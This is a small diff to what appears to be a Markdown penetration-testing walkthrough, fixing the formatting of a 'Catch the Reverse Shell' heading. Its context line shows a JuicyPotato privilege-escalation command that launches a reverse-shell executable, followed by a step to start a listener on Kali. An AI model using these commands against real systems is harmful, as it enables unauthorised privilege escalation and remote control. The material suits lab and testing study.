@@ -86,7 +86,7 @@ JuicyPotato.exe -l 1337 -p C:\Users\Public\revshell.exe -t * -c {e60687f7-01a1-4
 
 ---
 
-## 7. **Catch the Reverse Shell
+## 7. Catch the Reverse Shell
 
 Start your listener on Kali:
 
